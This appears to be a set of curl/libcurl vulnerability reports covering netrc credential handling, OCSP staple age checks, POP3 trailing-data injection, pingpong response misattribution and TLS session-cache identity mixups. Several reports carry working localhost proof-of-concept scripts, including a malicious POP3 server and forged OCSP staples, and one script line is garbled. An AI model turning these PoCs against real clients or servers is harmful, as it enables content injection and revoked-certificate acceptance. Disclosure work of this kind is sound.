title: CURL_NETRC_REQUIRED sends the URL password when the .netrc file has no matching entry
body:
## Summary
In required netrc mode (CURL_NETRC_REQUIRED, as set by `--netrc` or `--netrc-file`), the CURLOPT_NETRC documentation says any credential information present in the URL is ignored, but when the configured .netrc file loads successfully yet has no entry matching the requested host and username, libcurl keeps the password from the URL and sends it to the server as preemptive HTTP Basic authentication.

Affected version:
curl/libcurl 8.23.0 and current git master (8.23.1-DEV, commit eabeacb9ff), macOS; 8.20.0 does not behave this way.

Steps To Reproduce:
```sh
# a .netrc that loads but has no entry for user 'alice'
printf 'machine example.com login bob password sekret\n' > nrc

# start any local HTTP server on 127.0.0.1:$PORT that logs request headers,
# then (required mode is implied by --netrc-file; URL carries user AND password):
curl -v --netrc-file nrc \
  --resolve example.com:$PORT:127.0.0.1 \
  "http://alice:secret@example.com:$PORT/"
```
After the request goes out it carries `Authorization: Basic YWxpY2U6c2VjcmV0` (base64 of `alice:secret`), so the URL password `secret` is transmitted even though required mode matched no .netrc entry.

## Impact

An application that forwards externally supplied URLs to libcurl and selects required netrc mode specifically to stop URL-embedded credentials from being used would, when its .netrc has no matching entry, still send the URL password to that URL's host, contrary to the documented behavior. The scope is limited because the password is the one already present in the fetched URL and it is sent only to that same host, so no stored .netrc secret is exposed, credentials do not cross origins, and there is no server-side authentication bypass.

title: --cert-status with OpenSSL accepts a stapled OCSP response of any age when it lacks nextUpdate (revoked certificate keeps passing)
body:
## Summary:

curl built with OpenSSL accepts a stapled OCSP "good" response of any age under CURLOPT_SSL_VERIFYSTATUS (--cert-status) when the response omits nextUpdate, so a response signed before a certificate was revoked keeps passing the check for as long as the certificate itself is valid. The GnuTLS backend of the same curl rejects that old response, the OpenSSL backend applies no age limit at all. Omitting nextUpdate is the default behavior of the openssl ocsp responder, so private CAs built on it produce exactly these responses, and anyone who captured a "good" response for a certificate before its revocation can replay it indefinitely with the revoked key. I reproduced this on Linux with curl built from the curl-8_23_0 tag and from master b5ca96a441 against OpenSSL 3.6.4 using the script below, which makes a CA and a leaf valid since 500 days and staples three responses signed now, a fresh "good" one, a fresh "revoked" one and a "good" one with thisUpdate 400 days in the past and no nextUpdate (producedAt is current, curl only looks at thisUpdate and nextUpdate), and the OpenSSL builds exit 0, 91 and 0 for them while the GnuTLS builds exit 0, 60 and 60. AI tooling helped me with the test script, the setup and the numbers are mine.

```python

#!/usr/bin/env python3
# curl --cert-status with OpenSSL: a fresh "revoked" staple is rejected, an old "good" one for the same cert without nextUpdate is accepted
# needs: python3 cryptography, openssl s_server on PATH; usage: python3 poc_ocsp_age.py /path/to/curl
import datetime, subprocess, sys, time
from cryptography import x509
from cryptography.x509 import ocsp
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
now = datetime.datetime.now(datetime.timezone.utc); day = datetime.timedelta(days=1)
def cert(name, key, issuer, ikey, ca):
    b = x509.CertificateBuilder().subject_name(name).issuer_name(issuer).public_key(key.public_key()).serial_number(x509.random_serial_number())
    b = b.not_valid_before(now - 500 * day).not_valid_after(now + 30 * day).add_extension(x509.BasicConstraints(ca=ca, path_length=None), critical=True)
    if not ca: b = b.add_extension(x509.SubjectAlternativeName([x509.DNSName('localhost')]), critical=False)
    return b.sign(ikey, hashes.SHA256())
cakey, leafkey = rsa.generate_private_key(65537, 2048), rsa.generate_private_key(65537, 2048)
can = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, 'poc ca')]); ca = cert(can, cakey, can, cakey, True)
leaf = cert(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, 'localhost')]), leafkey, can, cakey, False)
pem = serialization.Encoding.PEM
open('ca.pem', 'wb').write(ca.public_bytes(pem)); open('leaf.pem', 'wb').write(leaf.public_bytes(pem))
open('leaf.key', 'wb').write(leafkey.private_bytes(pem, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
def staple(name, status, this_update, next_update, rtime=None, reason=None):
    b = ocsp.OCSPResponseBuilder().add_response(cert=leaf, issuer=ca, algorithm=hashes.SHA1(), cert_status=status, this_update=this_update,
        next_update=next_update, revocation_time=rtime, revocation_reason=reason).responder_id(ocsp.OCSPResponderEncoding.NAME, ca)
    open(name, 'wb').write(b.sign(cakey, hashes.SHA256()).public_bytes(serialization.Encoding.DER))
    srv = subprocess.Popen(['openssl', 's_server', '-accept', '8443', '-cert', 'leaf.pem', '-key', 'leaf.key', '-cert_chain', 'ca.pem', '-status_file', name, '-www', '-quiet'])
    time.sleep(1); r = subprocess.run([sys.argv[1], '-sS', '--cacert', 'ca.pem', '--cert-status', '-o', '/dev/null', 'https://localhost:8443/']); srv.terminate(); srv.wait(); return r.returncode
print('fresh good staple (thisUpdate 1 hour ago, nextUpdate tomorrow):    exit', staple('good.der', ocsp.OCSPCertStatus.GOOD, now - day / 24, now + day))
print('fresh revoked staple (thisUpdate 1 hour ago, ntaple('revoked.der', ocsp.OCSPCertStatus.REVOKED, now - day / 24, now + day, now - 30 * day, x509.ReasonFlags.key_compromise))
print('old good staple (thisUpdate 400 days ago, no nextUpdate):          exit', staple('old.der', ocsp.OCSPCertStatus.GOOD, now - 400 *
day, None))```

```
$ python3 poc_ocsp_age.py ./curl-openssl
curl: (91) SSL certificate revocation reason: keyCompromise (1)
fresh good staple (thisUpdate 1 hour ago, nextUpdate tomorrow):    exit 0
fresh revoked staple (thisUpdate 1 hour ago, nextUpdate tomorrow): exit 91
old good staple (thisUpdate 400 days ago, no nextUpdate):          exit 0
$ python3 poc_ocsp_age.py ./curl-gnutls
fresh good staple (thisUpdate 1 hour ago, nextUpdate tomorrow):    exit 0
fresh revoked staple (thisUpdate 1 hour ago, nextUpdate tomorrow): exit 60
old good staple (thisUpdate 400 days ago, no nextUpdate):          exit 60
```

## Affected version

```
curl 8.23.0-DEV (x86_64-pc-linux-gnu) libcurl/8.23.0-DEV OpenSSL/3.6.4 zlib/1.3.2 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.23.3 nghttp2/1.70.0 OpenLDAP/2.6.14
```

## Steps To Reproduce:

```
python3 poc_ocsp_age.py /path/to/curl
```

## Impact

## Summary:

A client that requires OCSP stapling keeps trusting a certificate after its revocation when the other side holds the revoked key and a "good" response captured before the revocation from a responder that omits nextUpdate, which the stock openssl ocsp responder does, so revocation is never enforced for the lifetime of that certificate.

title: POP3: data after the end-of-body terminator is written into the retrieved message
weakness: Acceptance of Extraneous Untrusted Data With Trusted Data
body:
## Vulnerability Information

When a POP3 server sends the end-of-body terminator and further data in the same read, curl
writes the bytes after the terminator into the retrieved message's output file and still reports
success. The PoC returns the message, its "." line, and then a second "+OK" response that answers
no command; the file for message 1 becomes b'HONEST-ONE\r\n.\r\n+OK 99\r\nATTACKER-TWO\r\n'
instead of b'HONEST-ONE\r\n'. lib/pop3.c:1241 hands the receive buffer's leftover bytes to
pop3_write() as more body, and the comment there states that "there may even be additional headers
after the body". A malicious or compromised POP3 server, or an on-path attacker against cleartext
POP3, can therefore append attacker-chosen bytes to any downloaded message and the application
cannot detect it, because the transfer exits 0. Reproduced on curl 8.21 and current master.

    python3 poc.py
    exit=0  message 1 file: b'HONEST-ONE\r\n.\r\n+OK 99\r\nATTACKER-TWO\r\n'
    expected:  b'HONEST-ONE\r\n'


## PoC (26 non-empty lines, stdlib only, localhost only)

```python
import socket, subprocess, threading, time, os
def srv(p):
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", p)); s.listen(1); c, _ = s.accept(); b = b""
    c.sendall(b"+OK ready\r\n")
    while True:
        d = c.recv(4096)
        if not d: return
        b += d
        while b"\r\n" in b:
            l, _, b = b.partition(b"\r\n"); u = l.split(b" ")[0].upper()
            if u == b"RETR":
                # ONE write: the message, its "." terminator, then a second
                # response that answers nothing
                c.sendall(b"+OK 12\r\nHONEST-ONE\r\n.\r\n"
                          b"+OK 99\r\nATTACKER-TWO\r\n.\r\n")
            elif u == b"CAPA": c.sendall(b"+OK\r\nUSER\r\n.\r\n")
            elif u == b"QUIT": c.sendall(b"+OK bye\r\n"); return
            else: c.sendall(b"+OK\r\n")
p = 12345
threading.Thread(target=srv, args=(p,), daemon=True).start(); time.sleep(0.4)
if os.path.exists("m1"): os.unlink("m1")
r = subprocess.run(["curl", "-s", "-S", "-u", "u:p", "-o", "m1",
                    "pop3://127.0.0.1:%d/1" % p])
print("exit=%d  message 1 file: %r" % (r.returncode, open("m1", "rb").read()))
print("expected:  b'HONEST-ONE\r\n'")
```

## Where this came from

Found while testing a separate reuse issue. The distinguishing point is that here the extra bytes
are already in curl's buffer **while the transfer is still running**, so this is not a race the
client could lose — a client must stop at the `.` terminator.

## Held back, available on request

The affected code path and why the leftover is treated as body, with the fix shape: `lib/imap.c:1417-1437` has the same construct and the same comment but clamps the write to the declared literal size (`if((curl_off_t)chunk > size) chunk = size`), while `lib/pop3.c:1252` passes `curlx_dyn_len(&pp->recvbuf)` with no bound · IMAP, SMTP and FTP checked and not affected · the separate connection-reuse finding this was found alongside · AI-use disclosure details.

## Impact

Primary — silent integrity failure of a downloaded message. curl -o msg1 pop3://srv/1 produces a file that is not what the mailbox   stored: the message, then a literal . line, then arbitrary server-chosen bytes — and curl exits 0.

   1. Content injection attributed to a real message. The appended bytes sit inside the file the user asked to be "message 1 from my   mailbox", after genuine content from a known sender. Anything consuming that file — a client's display, an archive, a search index, a filter, an agent summarising mail — ingests text the mailbox never contained. Comparing against the server shows a different artifact.
   2. No signal. Exit 0, no warning, no size discrepancy surfaced. An integrity-sensitive application has nothing it can check, so it   cannot defend even if it wants to.
   3. Message-boundary corruption. The file contains a bare . line, which is not legal inside a POP3 message body. Anything that re-splits on lines, re-forwards, or re-uploads the file mis-frames it; for MIME it can shift part boundaries.
   4. Availability/correctness. Byte-exact consumers (maildir sync, signed document retrieval, backups) silently get garbage.

   Who can trigger it: on cleartext POP3 (port 110, no STLS) an on-path attacker needs no server compromise — that's the strongest   scenario. With POP3S it takes a malicious or compromised server or mail proxy. No user interaction beyond downloading.

   What it is not — say it before they do: no memory corruption or code execution (I traced the state machine; eob only ranges 0→5, so the    POP3_EOB, prev writes stay inside the 5-byte static string), no credential exposure, no other user's mail, no write outside the -o   path the app chose, and no cascade — in my two-URL test message 2 still got its honest answer.

title: A server response that answers nothing is used as the next transfer's reply — and with IMAP, a fully compliant server does this by accident
body:
**Name:** Maturi Jaswanth Sai Madhu Mohan

**Product:** curl / libcurl — **all four pingpong protocols demonstrated: IMAP, POP3, SMTP and FTP**
— the same protocol set curl's own CVE-2026-92387 names

**Affected:** reproduced on current git master **`dbb8262a9c`** (8.23.1-DEV, fetched and rebuilt
today), on `d1d4b5931a`, on local `8.23.0-DEV` and `8.22.0-DEV` builds, and on the distro
**`curl 8.21.0`** binary in `/usr/bin/curl`. The mechanism predates all of them.

**Class:** response misattribution across transfers on a reused connection. In the FTP variant it
also steers where curl opens the next **outbound data connection**.

**Severity:** I suggest **Low**, and would understand Medium on the strength of the IMAP leg, which
needs no attacker at all — just a server behaving normally while a client fetches two messages.
Nothing here is memory unsafety and no credential is leaked.


## The one-sentence version

When a pingpong server sends a line that no command asked for, curl keeps it in the connection's
receive buffer and answers the **next** command with it. Demonstrated on all four protocols —
**IMAP, POP3, SMTP and FTP** — the same set curl's own CVE-2026-92387 names. Depending on the
protocol the next transfer gets the wrong content with exit 0 (POP3, IMAP with a body), fails on a
reply that belongs to another command (IMAP, SMTP), or opens its data connection where a stray line
pointed (FTP). It survives curl's own connection-reuse check because that check polls the socket
once, at reuse time.


## Why this is in scope, and not a severity opinion

On 2026-10-15 curl merged **`ef6b17cf12` "conncache: poll an idle connection for pending input on
every reuse"** (Bug: hackerone **4098761**, Closes #23412). Its message states the policy in curl's
own words:

> An idle HTTP/1.1 connection that had received unsolicited data from the server was then reused
> within that second and **the stray bytes came back as the response to the next request, so every
> later response on that connection was shifted by one.** […]
> **RFC 9112 section 9.2 says a client must not treat data received with no outstanding request as a
> response**, so poll for pending input on every reuse of an idle non-multiplexed connection […]

This report is the same consequence, on the pingpong protocols, **with that commit present**. The
poll is a single snapshot of the socket at the moment reuse is decided. It cannot cover the case
where the server pushes its unrequested reply a moment later — which is exactly what a server that
wants to desynchronise a reused connection would do. The remaining gap is not the poll's timing, it
is that the pingpong parser has no notion of *which command a reply answers*: whatever is next in
the buffer becomes the response.

### Each ingredient of this bug already has a CVE

| precedent | what curl treated as a vulnerability | where it lands here |
|---|---|---|
| **CVE-2026-92387** — advisory 2026-10-14, *"never-ending loop via server response omission"*, affected 8.10.0–8.22.0, severity **Low** | "By permanently omitting the final control-response line, a malicious **FTP, IMAP, POP3, or SMTP** server can exploit libcurl and completely bypass its configured transfer timeout mechanism"; its recommendation C is "Avoid using the ping-pong protocols" | the threat model is accepted: a server on exactly these four protocols, exploiting how its responses are framed — and graded Low. This report covers the same four protocols and the same framing weakness, with the addition that the IMAP trigger needs no malice |
| **CVE-2020-8284** — *"trusting FTP PASV responses"* | curl connecting wherever a `227` line told it to; mitigated by `--ftp-skip-pasv-ip`, on by default | the same trust, reached differently: this `227` answers **nothing**. The default mitigation still holds the address and lets the port move; with `--no-ftp-skip-pasv-ip` both move |
| **CVE-2026-86411** — *"FTP connection reuse inherits client-certificate"*; **CVE-2023-27535** — *"FTP too eager connection reuse"* | per-connection state from one transfer affecting a later transfer that reused the connection | the same shape, except the inherited state is the pingpong receive buffer instead of a credential |
| **hackerone 4098761 → `ef6b17cf12`** (2026-10-15) | "the stray bytes came back as the response to the next request, so every later response on that connection was shifted by one" | the identical consequence, on the protocols whose buffered leftovers that commit's socket poll cannot see |

I am not asking for a higher band than curl gives this family: CVE-2026-92387 is Low and so is my
suggestion. The difference is the outcome — theirs is a hang, mine is wrong content delivered with
exit code 0, and an outbound data connection to a port the server picked in a line that answered
nothing.


## Summary

One curl invocation, two transfers, one connection. The server sends one line that no command asked
for. curl takes it as the answer to the second transfer's command:

1. **IMAP — a compliant server does this on its own, no attacker.** Untagged responses are legal at
   any moment in RFC 3501, and servers really send them when a phone marks mail read. One such line
   landing between two fetches makes the **second fetch fail with exit 8** (`Failed to parse FETCH
   response`), and if the untagged response carries a body, that body is written out as the next
   message's content with **exit 0**.
2. **POP3 — content substitution, reported as success.** `message 2` written to disk is
   attacker-chosen text. The honest reply to `RETR 2` is displaced and becomes the new leftover, so
   everything after it is shifted by one — the wording of `ef6b17cf12`'s own bug report. Exit code
   0, no warning.
3. **SMTP — the next submission is lost.** The stray `250` is taken as the reply to the next
   `MAIL FROM`, every following reply slides by one, `DATA` is answered with a `250` where `354` is
   required, and the submission fails with exit 55. Stated precisely because it matters: curl does
   **not** report a false success here — the damage is a lost mail, not a silent one.
4. **FTP — the next data connection goes where the stray line points.** The unrequested reply is
   `227 Entering Passive Mode (…)` naming a port. Transfer 2 opens its data connection there and
   the honest `227` for that same `PASV` goes unused. With default options the *port* is attacker-
   chosen and the address stays curl's own; with `--no-ftp-skip-pasv-ip` the line chooses the
   **address too**.

## Evidence 1 — IMAP, with a server doing nothing unusual

Two messages, one command line, one connection. Between the two fetches the server sends

```
* 2 FETCH (UID 2 FLAGS (\Seen))
```

which is what any IMAP server does when another client marks a message read — RFC 3501 permits
untagged responses at any time. curl then asks for message 2 and reads that leftover as its reply:

```
  > A004 FETCH 1 BODY[]
  < * 1 FETCH (UID 1 BODY[] {20}          HONEST-BODY-OF-MSG-1
  < A004 OK FETCH completed
  < * 2 FETCH (UID 2 FLAGS (\Seen))        <- untagged, nothing outstanding
  > A005 FETCH 2 BODY[]
  < * 2 FETCH (UID 2 FLAGS (\Seen))        <- curl parses THIS as A005's answer
  * Failed to parse FETCH response.
  exit=8   m1='HONEST-BODY-OF-MSG-1'   m2=<no file>
```

The honest `* 2 FETCH (UID 2 BODY[] …)` that the server did send never reaches the application.

Same shape, with a body in the untagged response, and it is **silent**:

```
curl exit code        : 0
message 1 received    : HONEST-BODY-OF-MSG-1
message 2 received    : OTHER-SESSION-CONTENT-XY   (the server's honest answer was HONEST-BODY-OF-MSG-2)
```

**Control** — identical two-fetch command, no untagged line: both messages honest, exit 0, one
connection. (A body-bearing untagged `FETCH` is less common unsolicited than a `FLAGS` one; the
`FLAGS` case is the one that needs nothing unusual from the server at all, and it is the one that
fails the transfer.)

I also checked the six untagged forms a server really uses — `* N EXISTS`, `* N EXPUNGE`,
`* BYE`, `* STATUS`, `* N FETCH (FLAGS …)`, `* N FETCH (BODY[] …)` — inserted **during** a transfer
as well as **between** transfers. During a transfer curl handles every one of them correctly; only
the between-commands case mis-attributes them. That is consistent with the leftover being replayed
by the connection-level buffer rather than by IMAP's own parser.

## Evidence 2 — POP3 (all three scenarios come from one run of `poc.py`)

**1/3 — the bug.** Server pushes one multi-line reply 30 ms after finishing message 1, with nothing
outstanding. curl then starts transfer 2 on the reused connection.

```
  0.442s CURL   -> SERVER  RETR 1
  0.442s SERVER -> CURL    +OK 1 octets / HONEST-MESSAGE-ONE / .   (answer to RETR 1)
  0.472s SERVER -> CURL    +OK 1 octets / ATTACKER-INJECTED-CONTENT / .   <<< UNSOLICITED, NOTHING OUTSTANDING
  0.472s CURL   -> SERVER  RETR 2
  0.472s SERVER -> CURL    +OK 1 octets / HONEST-MESSAGE-TWO / .   (honest answer to RETR 2)

curl exit code        : 0
TCP connections used  : 1
message 1 received    : HONEST-MESSAGE-ONE
message 2 received    : ATTACKER-INJECTED-CONTENT   (server's honest answer was HONEST-MESSAGE-TWO)
VERDICT               : BUG REPRODUCED - attacker text delivered as message 2, exit code 0, on the
                        reused connection
```

The honest reply **was** sent and the application never saw it.

**2/3 — the control that makes the mechanism clear.** Identical server, but transfer 2 is made to
start ~3 s later (`--rate 1/3s`), so curl's reuse check now runs *after* the stray bytes have
arrived. curl refuses the connection and opens a fresh one, and message 2 is honest:

```
curl exit code        : 0
TCP connections used  : 2   (the connection was NOT reused)
message 2 received    : HONEST-MESSAGE-TWO
```

So `ef6b17cf12` is working as designed and I am not claiming it is broken. What this pair shows is
that a check at reuse time cannot protect a transfer whose *response* is what the stray data gets
confused with. The server decides the timing; a server that pushes the line after curl's check
still gets it delivered as the next response.

**3/3 — A/B control.** Same script, unsolicited reply switched off: honest message 2, exit 0, one
connection. The only difference between 1/3 and 3/3 is that one reply.

## Evidence 3 — SMTP: the next submission is lost

The server pushes `250 STRAY-QUEUED-NOTHING-OUTSTANDING` right after honestly accepting message 1.
Transfer 2 then submits on the reused connection, and the server answers every one of its commands
correctly:

```
  > MAIL FROM:<sender@example.invalid>          (submission 2)
  < 250 STRAY-QUEUED-NOTHING-OUTSTANDING        <- the stray, not a reply to this
  > RCPT TO:<rcpt1@example.invalid>
  < 250 2.1.0 Sender ok                         <- the reply that belongs to MAIL FROM
  > RCPT TO:<rcpt2@example.invalid>
  < 250 2.1.5 Recipient ok                      <- the reply to the RCPT before it
  > DATA
  < 250 2.1.5 Recipient ok                      <- a 250 where 354 is required
  curl exit code : 55   messages the server actually accepted: 1 of 2
```

Everything is shifted by one, so the second submission dies on a `250` that was the answer to
`RCPT TO`. **Control** (same two submissions, no stray line): both accepted, exit 0.

I am deliberately not dressing this up: curl reports failure rather than a false success, so what
the stray line costs here is a mail that never got sent, not a phantom confirmation.

## Evidence 4 — FTP (default options, then `--no-ftp-skip-pasv-ip`, then control)

Port 54127 is the honest passive port, 55967 is the one named by the unrequested line. The attacker
listener is bound **only** on 55967, so an accepted connection there cannot have come from anything
else. Verbatim from the run:

```
  5.477s CURL   -> SERVER  PASV
  5.477s SERVER -> CURL    227 Entering Passive Mode (127,0,0,1,211,111).   (honest answer to PASV #1)
  5.477s SERVER -> CURL    *** HONEST data listener on 127.0.0.1:54127 ACCEPTED a connection from 127.0.0.1:48798 ***
  5.548s SERVER -> CURL    227 Entering Passive Mode (127,0,0,1,218,159).   <<< UNSOLICITED - NO COMMAND OUTSTANDING
  5.628s CURL   -> SERVER  PASV
  5.628s SERVER -> CURL    227 Entering Passive Mode (127,0,0,1,211,111).   (honest answer to PASV #2)
  5.628s SERVER -> CURL    *** ATTACKER data listener on 127.0.0.1:55967 ACCEPTED a connection from 127.0.0.1:35910 ***
  (curl's own -v output for the same two transfers)
  5.630s   curl          < 227 Entering Passive Mode (127,0,0,1,211,111).
  5.630s   curl          * Connecting to 127.0.0.1 port 54127
  5.630s   curl          > PASV
  5.630s   curl          < 227 Entering Passive Mode (127,0,0,1,218,159).
  5.630s   curl          * Connecting to 127.0.0.1 port 55967
```

`218,159` is 55967 — the port from the line that answered nothing, and curl's own verbose output
shows it connecting there for transfer 2 while the honest `227` for that `PASV` (54127) is consumed
by the *following* command.

With `--no-ftp-skip-pasv-ip`, the same single line moves the **address** as well; the listener is
bound on 127.0.0.2 only:

```
  ==> UNSOLICITED 227 -> 127.0.0.2:<attacker port> (NO COMMAND OUTSTANDING)
  *** EVILIP listener ACCEPTED data connection 127.0.0.2:<attacker port> ***
```

**Control** (identical setup, unsolicited line switched off): both transfers use the honest port,
both files contain `HONEST-DATA`, exit code 0.

Bounding the impact honestly: in the FTP case the transfer then fails (`rc=19`, one file short), so
what I can show is an outbound connection to an attacker-chosen port/address and a lost or
substituted file — not a silent success. The POP3 case is the silent one.

## Root cause: two paths, and they need different fixes

`lib/pingpong.c` keeps one receive buffer **per connection**, and it deliberately retains the bytes
that follow a response's final line:

* `lib/pingpong.c:308-316` — at end of response the final line is kept for the outer parser and
  `pp->overflow` is set to the byte count after it (`:314`);
* `lib/pingpong.c:246-252` — on the next call the retained remainder is replayed (`:251`);
* `lib/pop3.c:1242-1264` — POP3's loop says *"keep only the overflow"* (`:1247`) and keeps those
  bytes for the next command; FTP does the same at `lib/ftp.c:480`, `:500`, `:3209`.

That state is attached to the connection, not the easy handle —
`pop3_setup_connection()` uses `Curl_conn_meta_set(conn, CURL_META_POP3_CONN, pop3c,
pop3_conn_dtor)` (`lib/pop3.c:1687`) and it is freed only when the connection dies. So a second
easy handle reusing the connection inherits the buffer.

The reuse decision cannot see any of that. `Curl_cpool_conn_seems_healthy()` computes `poll_input`
(`lib/conncache.c:1056`) and calls `Curl_conn_is_alive()`, whose socket filter ends at
`lib/cf-socket.c:1829` — `r = Curl_poll(pfd, 1, 0);`. `Curl_conn_data_pending()` exists and is what
would expose buffered input, but it is never consulted in the reuse path.

I separated the two ways a stray line ends up answering the wrong command, by patching and
re-running:

**Path A — the stray was already read into curl's buffer before the transfer ended.** Proven by
patching: adding a `Curl_pp_reset_recv()` call to `pop3_done()`, `imap_done()`, `smtp_done()` and
`ftp_done()` (drop `pp->recvbuf`, `nfinal`, `overflow` when a transfer finishes) **fixes the FTP
leg** — both FTP scenarios go from `data connections accepted: HONEST, ATTACKER` to
`HONEST, HONEST` with exit 0, and the FTP control scenario is unaffected. The patch is attached as
`pingpong-reset-recv-at-transfer-end.patch`; it is 49 added lines and builds warning-free.

**Path B — the stray arrives *after* the reuse poll and after the previous transfer ended.** This is
what the POP3, IMAP and SMTP scenarios do, and it is why they still reproduce with path A closed:
the bytes were never in curl's buffer at transfer-end, they were in flight. No snapshot check can
catch them. The only real defence is per-command correlation:

* **IMAP has it and does not use it here.** `imap_endofresp()` (`lib/imap.c`) correctly separates
  tagged replies (matched against `imapc->resptag`) from untagged ones. The damage is done one step
  later: an untagged `FETCH` that does not match what the command asked for is fed into the FETCH
  parser and **fails the command** (`Failed to parse FETCH response`, exit 8) instead of being
  treated as the information it is while curl keeps waiting for its tagged reply. That is a
  protocol-level fix in IMAP's own state machine, and it is the one I would attempt first.
* **POP3 and SMTP have nothing to correlate with** — a bare `+OK`/`250` carries no request
  identifier. For those two, a client genuinely cannot tell an early reply from an unsolicited one
  over TCP. I am not going to pretend the patch above fixes them, and I would rather hear how the
  maintainers want to handle that than invent a framing scheme.

## Steps to reproduce

Needs only `python3` (stdlib) and a curl with IMAP + POP3 + SMTP + FTP support (standard builds).
Localhost, no root, no external host, ~25 seconds.

```
cd report-a-pingpong-reuse-bypass
CURL=/path/to/curl python3 poc.py            # all eleven scenarios + verdicts
CURL=/path/to/curl python3 poc.py imap       # the IMAP three - compliant server
CURL=/path/to/curl python3 poc.py smtp       # the SMTP pair
CURL=/path/to/curl python3 poc.py pop3       # the POP3 three
CURL=/path/to/curl python3 poc.py ftp        # the FTP three
```

`poc.py` prints both sides of the conversation with timestamps, picks free ports by itself, and
ends with a `BUG REPRODUCED` / `control behaves correctly` verdict per scenario. Retrieved files are
left in a temp directory whose path it prints.

Manual equivalent of the POP3 case, if you would rather drive it yourself — the important part is
**two URLs in one command line**, which is what forces the reuse:

```
curl -v -u u:p -o msg1.txt pop3://<server>/1 -o msg2.txt pop3://<server>/2
```

against a server that, immediately after completing message 1's `. CRLF`, sends

```
+OK 1 octets\r\nATTACKER-INJECTED-CONTENT\r\n.\r\n
```

Separate curl invocations do **not** reproduce it (each process has its own connection); I made
that mistake first, which is why it is written down.

## Suggested fix

Reading the "Root cause" section above first, because the honest answer is that one patch does not
cover it:

1. **IMAP**: an untagged response must never be able to fail the command that happens to be
   outstanding. Handle it as information and keep waiting for the tagged reply. This is the one
   that needs no attacker and is entirely within curl's reach — IMAP already parses tags
   correctly, so this is about what the FETCH state machine does with a line it has already
   identified as untagged.
2. **All four**: drop the pingpong receive cache when a transfer ends, so bytes retained from the
   previous transfer cannot be replayed into the next one. I have this working (`49` lines,
   `pingpong-reset-recv-at-transfer-end.patch`); it verifiably fixes the FTP leg. Offered as a
   starting point, not as the answer to path B.
3. **POP3 / SMTP**: since these cannot be correlated client-side, the conservative option is to
   refuse reuse of a pooled pingpong connection whose buffer was non-empty at transfer end (curl
   already knows: `pp->overflow` / `Curl_pp_moredata()`), which turns path A into a fresh
   connection instead of a shifted response.
4. **FTP additionally**: only accept a `227`/`229` as data-connection information if a
   `PASV`/`EPSV` was actually outstanding when it was read.

I would rather send the version the maintainers would accept, so I am holding the patch until I
hear which of these directions they want — and I am happy to be told the framing belongs in the
protocol modules rather than in `lib/pingpong.c`.


** What is in this submission**

REPORT.md    this file
poc.py       the whole PoC - eleven scenarios, prints both sides of every conversation live
proof.png    one page: the five results with their controls, rendered from the PoC output
```

`python3 poc.py` needs only stdlib python3 and a curl with IMAP / POP3 / SMTP / FTP support. It binds
127.0.0.1 only, picks its own free ports and takes about 25 seconds. Everything in this report's
excerpts — including each server's own log of what it sent and when — is printed as it happens, so
the transcript can be regenerated rather than taken on trust.

The patch mentioned under "Suggested fix" is deliberately not attached: it is my own verification
tool, it fixes only path A, and attaching a partial fix to a security report helps nobody. Say the
word and I will send it or open a PR against whichever direction the maintainers prefer.

```

## Impact

Headline — the one sentence that carries it:
   │ What curl writes to your output file, and whether it tells you the transfer succeeded, is supposed to be determined by the server's   answer to the request curl actually made. On all four pingpong protocols a line the server sent while nothing was outstanding becomes the answer to the next command — so curl reports the wrong bytes as the right ones, or fails a command the server had already answered
correctly.

   Per leg (demonstrated → consequence → who can trigger it):
   - IMAP — an ordinary untagged * N FETCH (FLAGS …) between two fetches makes the second fetch fail (exit 8, file never written); an
   untagged FETCH carrying a body writes those bytes into the next message's file with exit 0. → No attacker needed. Any compliant server
   pushing a normal change notification while a phone/desktop touches the same mailbox. This is the leg to lead with.
   - POP3 — attacker-chosen text delivered as message 2, honest reply displaced, everything after shifted by one, exit 0. → Mail content
   the mailbox never stored reaches the app as a real message with a success code; anything downstream (storage, filters, scanners,
   display) trusts attacker-chosen text.
   - SMTP — stray 250 shifts replies until DATA gets a 250 instead of 354; submission lost, exit 55, server accepted 1 of 2. → I state
   explicitly that curl does not report a false success here, because that was the first thing I looked for and it isn't true.
   - FTP — transfer 2's data connection opened on the port named by a 227 that answered no PASV (address too with --no-ftp-skip-pasv-ip);
   transfer then fails exit 19. → An outbound connection whose destination is taken from a non-reply, plus a lost download.

title: TLS session cache ignores CURLOPT_SSL_CTX_FUNCTION identity and resumes one client's session for another
body:
**Researcher:** Maturi Jaswanth Sai
**Program:** curl (HackerOne)
**Asset:** github.com/curl/curl, `lib/vtls/vtls_scache.c`
**Affected:** curl 8.21.0, 8.22.0 and 8.23.0 (tag `curl-8_23_0`,
2026-10-14), plus master `eb2b201a` (8.23.1-DEV, 2026-10-19)
**Weakness:** CWE-295, wrong client identity on a resumed TLS session. Same
class as CVE-2016-5419 and CVE-2017-7468

Before we went into report to be clear I have created separate file for reproduce steps to validate manually for the team so check that.


## What happens

`CURLOPT_SSL_CTX_FUNCTION` lets an application configure the TLS context,
including loading a client certificate. Two easy handles that pick different
client certificates only through this callback, without setting
`CURLOPT_SSLCERT` or `CURLOPT_SSLKEY`, end up with the same TLS session-cache
peer key, because the key is built from `struct ssl_filter_config` fields and
never looks at the callback or its userdata.

The second handle opens its own TCP connection and its callback runs and loads
its own certificate, but curl offers the first handle's cached TLS session.
The server accepts the resumption, never asks for the second certificate, and
continues as the first identity. Both requests return the first client's data
and no error is reported.

## Root cause

`cf_ssl_peer_key_add_mtls()` (8.23.0, `lib/vtls/vtls_scache.c:126`) adds the
client certificate material that comes from the normal options:

```c
  if(ssl->clientcert && ssl->clientcert[0]) {
    result = cf_ssl_peer_key_add_path(buf, "CCERT", ssl->clientcert, is_local);
    ...
  if(ssl->key && ssl->key[0]) {
    result = cf_ssl_peer_key_add_path(buf, "KEY", ssl->key, is_local);
    ...
  if(ssl->key_blob) {
    result = cf_ssl_peer_key_add_hash(buf, "KEYBlob", ssl->key_blob);
```

`ssl_peer_key_build()` calls it at line 320. There is no entry for
`data->set.ssl_fsslctx` or `data->set.ssl_fsslctxp`, and no code that disables
the session cache when the callback is set.

The connection-reuse matcher (`match_ssl_primary_config()` in
`lib/vtls/vtls_config.c`) is fine and is not what causes this: the two requests
